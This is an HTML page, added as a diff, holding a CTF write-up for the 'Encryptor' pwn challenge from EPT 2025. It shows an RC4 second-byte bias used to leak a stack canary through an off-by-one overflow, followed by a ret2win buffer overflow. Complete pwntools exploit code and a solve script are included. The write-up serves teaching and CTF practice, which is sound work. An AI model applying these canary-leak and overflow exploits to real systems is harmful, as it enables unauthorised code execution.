@@ -1,0 +1,298 @@
+<!DOCTYPE html>
+<html lang="en">
+  <!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Encryptor (EPT 2025) | Zukane CTF</title>
+<meta name="generator" content="Jekyll v3.10.0" />
+<meta property="og:title" content="Encryptor (EPT 2025)" />
+<meta name="author" content="Zukane" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Challenge overview" />
+<meta property="og:description" content="Challenge overview" />
+<link rel="canonical" href="http://localhost:4000/encryptor/" />
+<meta property="og:url" content="http://localhost:4000/encryptor/" />
+<meta property="og:site_name" content="Zukane CTF" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2025-11-08T11:00:00+01:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Encryptor (EPT 2025)" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Zukane"},"dateModified":"2025-11-08T11:00:00+01:00","datePublished":"2025-11-08T11:00:00+01:00","description":"Challenge overview","headline":"Encryptor (EPT 2025)","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/encryptor/"},"url":"http://localhost:4000/encryptor/"}</script>
+<!-- End Jekyll SEO tag -->
+
+  <head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Encryptor (EPT 2025)</title>
+    <link rel="stylesheet" href="/assets/css/obsidian-theme.css">
+    <link rel="icon" type="image/png" href="/assets/images/favicon.png">
+    <meta name="google-site-verification" content="dyMwt_XPwaeGY1MubEtKTorF4C368AHqIwugUO8c6P8" />
+    <!-- MathJax configuration -->
+    <script>
+        window.MathJax = {
+          tex: {
+            packages: {'[+]': ['ams']},
+            inlineMath: [['$', '$'], ['\\(', '\\)']],
+            displayMath: [['$$', '$$'], ['\\[', '\\]']],
+            processEscapes: true,
+            tags: 'ams',
+            // Optional: Enable automatic equation numbering (if desired)
+            // equationNumbers: { autoNumber: "AMS" }
+          },
+          options: {
+            skipHtmlTags: ['script', 'noscript', 'style', 'textarea', 'pre']
+          }
+        };
+      </script>
+      <script id="MathJax-script" async
+              src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js">
+      </script>
+      
+  </head>
+  <body class="theme-dark">
+    <header>
+      <!-- Optionally, show a site title -->
+      <h1><a href="/", style="color: #ff5757;">Zukane CTF</a></h1>
+    </header>
+    <div class="container">
+      <!-- Display post title from front matter -->
+      
+        <h2 class="post-title">Encryptor (EPT 2025)</h2>
+      
+      
+        <div class="post-tags">
+            
+            <a href="/tags/rc4/" class="tag">RC4</a>
+            
+            <a href="/tags/distinguishing-attack/" class="tag">Distinguishing Attack</a>
+            
+            <a href="/tags/pwn/" class="tag">Pwn</a>
+            
+        </div>
+      
+
+      <!-- Main content -->
+      <h5 id="challenge-overview">Challenge overview</h5>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Grab your resident cryptographer and try our shiny new "Encryption-As-A-Service"!
+
+ncat --ssl encryptor-pwn.ept.gg 1337
+</code></pre></div></div>
+
+<p>In this CTF challenge we are given a binary named <code class="language-plaintext highlighter-rouge">encryptor</code> which presents us with an encryption service:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Welcome to the EPT encryptor!
+Please behave yourself, and remember to stay away from a certain function at 0x55667a4c54f0!
+1. Encrypt a message
+2. Reset the key and encrypt again
+3. Change offset
+4. Exit
+&gt;
+</code></pre></div></div>
+
+<p>Inspecting the binary’s security mechanisms, we can see everything is enabled:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Arch:     amd64-64-little
+RELRO:    Full RELRO
+Stack:    Canary found
+NX:       NX enabled
+PIE:      PIE enabled
+</code></pre></div></div>
+
+<p>Though, the program does leak the address to the <code class="language-plaintext highlighter-rouge">win()</code> function.</p>
+
+<h5 id="reverse-engineering">Reverse engineering</h5>
+
+<p>By picking choice 1 in the menu, we can encrypt a message of our choice:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">if</span> <span class="p">(</span><span class="n">menu_choice</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"Enter string to encrypt</span><span class="se">\n</span><span class="s">&gt; "</span><span class="p">);</span>
+    <span class="n">fgets</span><span class="p">(</span><span class="n">local_108</span><span class="p">,</span><span class="mi">242</span><span class="p">,</span><span class="n">stdin</span><span class="p">);</span>
+    <span class="n">RC4</span><span class="p">(</span><span class="n">key</span><span class="p">,</span><span class="n">local_108</span> <span class="o">+</span> <span class="n">local_18</span><span class="p">,</span><span class="n">local_1f8</span><span class="p">,</span><span class="n">local_108</span> <span class="o">+</span> <span class="n">local_18</span><span class="p">);</span>
+    <span class="n">puts_hex</span><span class="p">(</span><span class="n">local_1f8</span><span class="p">);</span>
+    <span class="n">resetKey</span><span class="p">();</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>The program uses <code class="language-plaintext highlighter-rouge">fgets()</code> to read 242 bytes of user input. The input is encrypted with RC4, the ciphertext is printed, before the encryption key is reset.  Notably, the program reads 242 bytes (241 bytes + null terminator) when the buffer is only 240 bytes:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">uchar</span> <span class="n">local_1f8</span> <span class="p">[</span><span class="mi">240</span><span class="p">];</span>
+<span class="kt">char</span> <span class="n">local_108</span> <span class="p">[</span><span class="mi">240</span><span class="p">];</span>
+</code></pre></div></div>
+
+<p>This allows us to overwrite one byte after our input buffer. The byte located here is the offset <code class="language-plaintext highlighter-rouge">local_18</code> which is used by the <code class="language-plaintext highlighter-rouge">RC4()</code> function to determine the start-offset for RC4’s input. The feature to control this offset value via menu option 3 <code class="language-plaintext highlighter-rouge">Change offset</code> is disabled:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&gt; 3
+Sorry, offset function disabled due to abuse!
+</code></pre></div></div>
+
+<p>The ability to control the offset value will prove to be useful, as we can use it to encrypt the stack canary, which is located 248 bytes after our input buffer:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>240-byte input buffer
+8-byte offset (or 1 byte + 7 unused bytes)
+8-byte stack canary
+8-byte saved rbp
+8-byte return address (rip)
+</code></pre></div></div>
+
+<h5 id="rc4-one-byte-bias">RC4 one-byte bias</h5>
+
+<p>With an ability to encrypt the stack canary, the focus shifts towards cryptographic attacks. RC4 is an stream-cipher which isn’t really used anymore, primarily because the keystream generated by RC4 is biased, making it vulnerable to “distinguishing attacks”. According to <a href="https://en.wikipedia.org/wiki/RC4#Biased_outputs_of_the_RC4">Wikipedia</a>, <code class="language-plaintext highlighter-rouge">the second output byte of the cipher was biased toward zero with probability 1/128 (instead of 1/256).</code></p>
+
+<p>Since the ciphertext is generated by XORing the plaintext and keystream:</p>
+
+\[\large C = P \oplus K\]
+
+<p>And the 2nd keystream byte is <code class="language-plaintext highlighter-rouge">\x00</code> 1/128 of the time (instead of 1/256 like other bytes), the most frequent ciphertext byte from many samples will be the exact plaintext byte with high likelihood.</p>
+
+<p>We can use this one-byte bias along with our control of the offset to line up the canary bytes with the 2nd byte of the keystream, collect many samples, and check the most frequently appearing byte to determine the stack canary byte at that index. By adjusting the offset for each canary byte, we are able to leak the full stack canary.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">from</span> <span class="nn">collections</span> <span class="kn">import</span> <span class="n">Counter</span>
+
+<span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s">"./encryptor"</span><span class="p">)</span>
+
+<span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"at "</span><span class="p">)</span>
+<span class="n">win</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">recvline</span><span class="p">().</span><span class="n">strip</span><span class="p">()[</span><span class="mi">2</span><span class="p">:</span><span class="o">-</span><span class="mi">1</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="s">"Win:"</span><span class="p">,</span> <span class="nb">hex</span><span class="p">(</span><span class="n">win</span><span class="p">))</span>
+
+<span class="k">def</span> <span class="nf">encrypt</span><span class="p">(</span><span class="n">string</span><span class="p">):</span>
+    <span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt; "</span><span class="p">)</span>
+    <span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">"1"</span><span class="p">)</span>
+    <span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt; "</span><span class="p">)</span>
+    <span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">string</span><span class="p">)</span>
+    <span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"Encrypted: "</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">p</span><span class="p">.</span><span class="n">recvline</span><span class="p">().</span><span class="n">strip</span><span class="p">()</span>
+
+<span class="k">def</span> <span class="nf">reset_key</span><span class="p">():</span>
+    <span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt; "</span><span class="p">)</span>
+    <span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">"2"</span><span class="p">)</span>
+    <span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"Encrypted: "</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">p</span><span class="p">.</span><span class="n">recvline</span><span class="p">().</span><span class="n">strip</span><span class="p">()</span>
+
+<span class="k">def</span> <span class="nf">recover_canary_byte</span><span class="p">(</span><span class="n">i</span><span class="p">):</span>
+    <span class="n">encrypt</span><span class="p">(</span><span class="sa">b</span><span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="o">*</span><span class="mi">240</span> <span class="o">+</span> <span class="n">p8</span><span class="p">((</span><span class="mh">0xF7</span> <span class="o">+</span> <span class="n">i</span><span class="p">)))</span>
+    <span class="n">cnt</span> <span class="o">=</span> <span class="n">Counter</span><span class="p">()</span>
+    <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">6000</span><span class="p">):</span>
+        <span class="n">ct_line</span> <span class="o">=</span> <span class="n">reset_key</span><span class="p">()</span>
+        <span class="n">b</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">ct_line</span><span class="p">[</span><span class="mi">2</span><span class="p">:</span><span class="mi">4</span><span class="p">],</span><span class="mi">16</span><span class="p">)</span>
+        <span class="n">cnt</span><span class="p">[</span><span class="n">b</span><span class="p">]</span> <span class="o">+=</span> <span class="mi">1</span>
+    <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"Recovered canary byte: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">cnt</span><span class="p">.</span><span class="n">most_common</span><span class="p">(</span><span class="mi">1</span><span class="p">)[</span><span class="mi">0</span><span class="p">][</span><span class="mi">0</span><span class="p">])</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">cnt</span><span class="p">.</span><span class="n">most_common</span><span class="p">(</span><span class="mi">1</span><span class="p">)[</span><span class="mi">0</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span>
+
+<span class="n">canary</span> <span class="o">=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x00</span><span class="s">"</span> <span class="o">+</span> <span class="nb">bytes</span><span class="p">(</span><span class="n">recover_canary_byte</span><span class="p">(</span><span class="n">i</span><span class="p">)</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">8</span><span class="p">))</span>
+<span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"canary = 0x</span><span class="si">{</span><span class="n">canary</span><span class="p">[</span><span class="si">::</span><span class="o">-</span><span class="mi">1</span><span class="p">].</span><span class="nb">hex</span><span class="p">()</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p><em>Note, we do not need to leak the first canary byte, as it is always <code class="language-plaintext highlighter-rouge">\x00</code></em></p>
+
+<p><em>Note 2, with 6000 samples, the correct byte is not always found due to statistics. Number of samples can be adjusted, but will take longer</em></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Win: 0x5cd7721b24f0
+Recovered canary byte: 0x33
+Recovered canary byte: 0x4d
+Recovered canary byte: 0xda
+Recovered canary byte: 0x28
+Recovered canary byte: 0xb0
+Recovered canary byte: 0x4f
+Recovered canary byte: 0xd
+canary = 0x0d4fb028da4d3300
+</code></pre></div></div>
+
+<h5 id="ret2win">ret2win</h5>
+
+<p>With the canary leaked, we can perform a buffer overflow and avoid stack smashing. The program has a secret menu option <code class="language-plaintext highlighter-rouge">1337</code>:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">if</span> <span class="p">(</span><span class="n">menu_choice</span> <span class="o">==</span> <span class="mi">1337</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"Leaving already? Enter feedback:</span><span class="se">\n</span><span class="s">&gt; "</span><span class="p">);</span>
+    <span class="n">pcVar1</span> <span class="o">=</span> <span class="n">fgets</span><span class="p">(</span><span class="n">local_108</span><span class="p">,</span><span class="mi">288</span><span class="p">,</span><span class="n">stdin</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>Here, the program reads in 288 bytes into the 240 byte buffer. This allows us to execute a ropchain to jump to the address of the win function, which is leaked on program startup:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">payload</span>  <span class="o">=</span> <span class="sa">b</span><span class="s">""</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"A"</span><span class="o">*</span><span class="mi">248</span>  <span class="c1"># Overwrite input buffer + offset
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">canary</span>    <span class="c1"># Write canary to avoid stack smashing
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"B"</span><span class="o">*</span><span class="mi">8</span>    <span class="c1"># Overwrite saved RBP
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">win</span><span class="p">)</span>  <span class="c1"># Set instruction pointer (rip) to the address of win()
+</span>
+<span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt; "</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">"1337"</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt; "</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Win: 0x570eb47344f0
+Recovered canary byte: 0x2c
+Recovered canary byte: 0x66
+Recovered canary byte: 0xd0
+Recovered canary byte: 0x2d
+Recovered canary byte: 0x72
+Recovered canary byte: 0x71
+Recovered canary byte: 0x78
+canary = 0x7871722dd0662c00
+EPT{local_test_flag_because_im_not_waiting_100_years_on_remote_again_:skull:}
+</code></pre></div></div>
+
+<p>Since we must collect many ciphertext samples from the program for the distinguishing attack, the program runs for a long time against the remote due to a lot of extra overhead.</p>
+
+<h5 id="solvepy">solve.py</h5>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">from</span> <span class="nn">collections</span> <span class="kn">import</span> <span class="n">Counter</span>
+
+<span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s">"./encryptor"</span><span class="p">)</span>
+<span class="c1">#p = remote("encryptor-pwn.ept.gg", 1337, ssl=True)
+</span>
+<span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"at "</span><span class="p">)</span>
+<span class="n">win</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">recvline</span><span class="p">().</span><span class="n">strip</span><span class="p">()[</span><span class="mi">2</span><span class="p">:</span><span class="o">-</span><span class="mi">1</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="s">"Win:"</span><span class="p">,</span> <span class="nb">hex</span><span class="p">(</span><span class="n">win</span><span class="p">))</span>
+
+<span class="k">def</span> <span class="nf">encrypt</span><span class="p">(</span><span class="n">string</span><span class="p">):</span>
+    <span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt; "</span><span class="p">)</span>
+    <span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">"1"</span><span class="p">)</span>
+    <span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt; "</span><span class="p">)</span>
+    <span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">string</span><span class="p">)</span>
+    <span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"Encrypted: "</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">p</span><span class="p">.</span><span class="n">recvline</span><span class="p">().</span><span class="n">strip</span><span class="p">()</span>
+
+<span class="k">def</span> <span class="nf">reset_key</span><span class="p">():</span>
+    <span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt; "</span><span class="p">)</span>
+    <span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">"2"</span><span class="p">)</span>
+    <span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"Encrypted: "</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">p</span><span class="p">.</span><span class="n">recvline</span><span class="p">().</span><span class="n">strip</span><span class="p">()</span>
+
+<span class="k">def</span> <span class="nf">recover_canary_byte</span><span class="p">(</span><span class="n">i</span><span class="p">):</span>
+    <span class="n">encrypt</span><span class="p">(</span><span class="sa">b</span><span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="o">*</span><span class="mi">240</span> <span class="o">+</span> <span class="n">p8</span><span class="p">((</span><span class="mh">0xF7</span> <span class="o">+</span> <span class="n">i</span><span class="p">)))</span>
+    <span class="n">cnt</span> <span class="o">=</span> <span class="n">Counter</span><span class="p">()</span>
+    <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">6000</span><span class="p">):</span>
+        <span class="n">ct_line</span> <span class="o">=</span> <span class="n">reset_key</span><span class="p">()</span>
+        <span class="n">b</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">ct_line</span><span class="p">[</span><span class="mi">2</span><span class="p">:</span><span class="mi">4</span><span class="p">],</span><span class="mi">16</span><span class="p">)</span>
+        <span class="n">cnt</span><span class="p">[</span><span class="n">b</span><span class="p">]</span> <span class="o">+=</span> <span class="mi">1</span>
+    <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"Recovered canary byte: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">cnt</span><span class="p">.</span><span class="n">most_common</span><span class="p">(</span><span class="mi">1</span><span class="p">)[</span><span class="mi">0</span><span class="p">][</span><span class="mi">0</span><span class="p">])</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">cnt</span><span class="p">.</span><span class="n">most_common</span><span class="p">(</span><span class="mi">1</span><span class="p">)[</span><span class="mi">0</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span>
+
+<span class="n">canary</span> <span class="o">=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x00</span><span class="s">"</span> <span class="o">+</span> <span class="nb">bytes</span><span class="p">(</span><span class="n">recover_canary_byte</span><span class="p">(</span><span class="n">i</span><span class="p">)</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">8</span><span class="p">))</span>
+<span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"canary = 0x</span><span class="si">{</span><span class="n">canary</span><span class="p">[</span><span class="si">::</span><span class="o">-</span><span class="mi">1</span><span class="p">].</span><span class="nb">hex</span><span class="p">()</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+
+<span class="n">payload</span>  <span class="o">=</span> <span class="sa">b</span><span class="s">""</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"A"</span><span class="o">*</span><span class="mi">248</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">canary</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"B"</span><span class="o">*</span><span class="mi">8</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">win</span><span class="p">)</span>
+
+<span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt; "</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">"1337"</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt; "</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div></div>
+
+
+    </div>
+    <footer>
+      <p>&copy; 2025 Zukane</p>
+    </footer>
+  </body>
+</html>
